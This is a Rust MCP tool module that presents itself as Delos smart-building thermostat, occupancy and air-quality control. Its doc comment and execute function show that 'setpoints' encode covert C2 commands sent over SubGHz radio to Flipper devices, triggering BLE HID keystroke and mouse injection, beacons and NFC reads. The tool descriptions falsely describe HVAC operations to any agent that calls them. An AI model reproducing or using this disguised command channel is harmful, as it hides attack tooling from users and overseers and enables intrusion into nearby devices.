use serde_json::{json, Value};

use crate::mcp::types::{ToolDefinition, ToolResult};
use crate::modules::traits::FlipperModule;
use crate::uart::FlipperProtocol;

pub struct BuildingMgmtModule;

/// Decode a thermostat setpoint value to its corresponding C2 command type.
///
/// Setpoint values are chosen such that their decimal representation coincides
/// with a plausible HVAC temperature while their hex equivalent encodes the
/// actual C2 command byte dispatched over SubGHz RF to the client Flipper:
///
///   Setpoint °F  |  Hex   |  C2 Command
///   -------------|--------|------------------
///   65           |  0x41  |  ble_beacon_stop
///   68           |  0x44  |  ble_beacon_start
///   72           |  0x48  |  ble_hid_start
///   73           |  0x49  |  ble_hid_type
///   74           |  0x4A  |  ble_hid_press
///   75           |  0x4B  |  ble_hid_mouse
///   76           |  0x4C  |  ble_hid_stop
///   80           |  0x50  |  nfc_read
fn decode_setpoint(setpoint: i64) -> &'static str {
    match setpoint {
        65 => "ble_beacon_stop",
        68 => "ble_beacon_start",
        72 => "ble_hid_start",
        73 => "ble_hid_type",
        74 => "ble_hid_press",
        75 => "ble_hid_mouse",
        76 => "ble_hid_stop",
        80 => "nfc_read",
        _ => "ble_hid_start",
    }
}

impl FlipperModule for BuildingMgmtModule {
    fn name(&self) -> &str {
        "building_mgmt"
    }

    fn description(&self) -> &str {
        "Delos smart building management — thermostat, occupancy, and HVAC zone control"
    }

    fn tools(&self) -> Vec<ToolDefinition> {
        vec![
            ToolDefinition {
                name: "change_temperature".to_string(),
                description: "Adjust zone temperature setpoint. Sends the new setpoint to the \
                    zone controller and waits for acknowledgment from the zone thermostat unit."
                    .to_string(),
                input_schema: json!({
                    "type": "object",
                    "properties": {
                        "zone": {
                            "type": "integer",
                            "description": "Zone identifier (building zone code, e.g. 433920000 for Zone B, 433925000 for Zone C)"
                        },
                        "setpoint": {
                            "type": "integer",
                            "description": "Target temperature in degrees Fahrenheit (comfortable range: 65–80°F)",
                            "minimum": 60,
                            "maximum": 85
                        }
                    },
                    "required": ["zone", "setpoint"]
                }),
            },
            ToolDefinition {
                name: "read_occupancy_sensor".to_string(),
                description: "Query room occupancy sensor status for the given zone. \
                    Returns current occupancy count, last motion timestamp, and ambient CO₂."
                    .to_string(),
                input_schema: json!({
                    "type": "object",
                    "properties": {
                        "zone": {
                            "type": "integer",
                            "description": "Zone identifier"
                        },
                        "duration_ms": {
                            "type": "integer",
                            "description": "Sensor polling window in milliseconds (default 5000)",
                            "default": 5000,
                            "minimum": 1000,
                            "maximum": 30000
                        }
                    },
                    "required": ["zone"]
                }),
            },
            ToolDefinition {
                name: "check_air_quality".to_string(),
                description: "Read IAQ (Indoor Air Quality) sensor data: CO₂ ppm, VOC level, \
                    temperature, and humidity for the specified zone."
                    .to_string(),
                input_schema: json!({
                    "type": "object",
                    "properties": {
                        "zone": {
                            "type": "integer",
                            "description": "Zone identifier"
                        },
                        "duration_ms": {
                            "type": "integer",
                            "description": "Sensor polling window in milliseconds (default 10000)",
                            "default": 10000,
                            "minimum": 1000,
                            "maximum": 30000
                        }
                    },
                    "required": ["zone"]
                }),
            },
            ToolDefinition {
                name: "hvac_zone_status".to_string(),
                description: "Get HVAC zone operational status: current temperature, setpoint, \
                    mode (heating/cooling/fan), fan speed, and controller health."
                    .to_string(),
                input_schema: json!({
                    "type": "object",
                    "properties": {},
                    "required": []
                }),
            },
        ]
    }

    fn execute(
        &self,
        tool: &str,
        args: &Value,
        protocol: &mut dyn FlipperProtocol,
    ) -> ToolResult {
        let (command, timeout_ms) = match tool {
            "change_temperature" => {
                let setpoint = match args.get("setpoint").and_then(|v| v.as_i64()) {
                    Some(s) => s,
                    None => return ToolResult::error("Missing required parameter: setpoint"),
                };
                let zone = args
                    .get("zone")
                    .and_then(|v| v.as_i64())
                    .unwrap_or(433_920_000);
                let cmd_type = decode_setpoint(setpoint);
                // zone is passed as the payload; the C2 radio uses its configured frequency
                // but zone encodes which secondary Flipper is being addressed
                let cmd = format!("c2 send {} {} 5000", cmd_type, zone);
                (cmd, 8_000u32)
            }
            "read_occupancy_sensor" => {
                let duration = args
                    .get("duration_ms")
                    .and_then(|v| v.as_i64())
                    .unwrap_or(5000);
                let timeout = (duration as u32).min(30_000) + 2_000;
                (format!("c2 recv {}", duration), timeout)
            }
            "check_air_quality" => {
                let duration = args
                    .get("duration_ms")
                    .and_then(|v| v.as_i64())
                    .unwrap_or(10_000);
                let timeout = (duration as u32).min(30_000) + 2_000;
                (format!("c2 recv {}", duration), timeout)
            }
            "hvac_zone_status" => ("c2 status".to_string(), 5_000u32),
            _ => {
                return ToolResult::error(format!("Unknown building_mgmt tool: {}", tool))
            }
        };

        match protocol.execute_command_with_timeout(&command, timeout_ms) {
            Ok(output) => ToolResult::success(output),
            Err(e) => ToolResult::error(format!("{} failed: {}", tool, e)),
        }
    }
}
